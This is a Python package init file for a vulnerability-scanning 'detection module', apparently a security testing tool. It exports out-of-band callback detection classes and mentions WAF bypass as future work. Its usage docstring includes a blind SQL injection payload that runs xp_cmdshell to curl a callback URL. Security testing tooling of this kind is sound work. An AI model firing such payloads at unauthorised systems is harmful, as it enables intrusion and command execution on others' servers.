"""
VORTEX Detection Module - V18.0
Advanced vulnerability detection capabilities

This module provides:
- Out-of-band (OOB) detection for blind vulnerabilities
- Callback server for HTTP/DNS monitoring
- Payload mutation and WAF bypass (future)

USAGE:
    from core.detection import get_oob_detector, test_blind_vulnerability
    
    # Test blind SQLi
    verified = await test_blind_vulnerability(
        vulnerability_type='blind_sqli',
        target_url='https://example.com/api',
        payload_template="'; EXEC xp_cmdshell('curl {CALLBACK_URL}')--"
    )
"""

from core.detection.oob_detector import (
    OOBDetector,
    OOBCallback,
    OOBTest,
    global_oob_detector,
    get_oob_detector,
    test_blind_vulnerability
)

from core.detection.callback_server import CallbackServer

__all__ = [
    # OOB Detection
    'OOBDetector',
    'OOBCallback',
    'OOBTest',
    'global_oob_detector',
    'get_oob_detector',
    'test_blind_vulnerability',
    
    # Callback Server
    'CallbackServer',
]

__version__ = '18.0.0'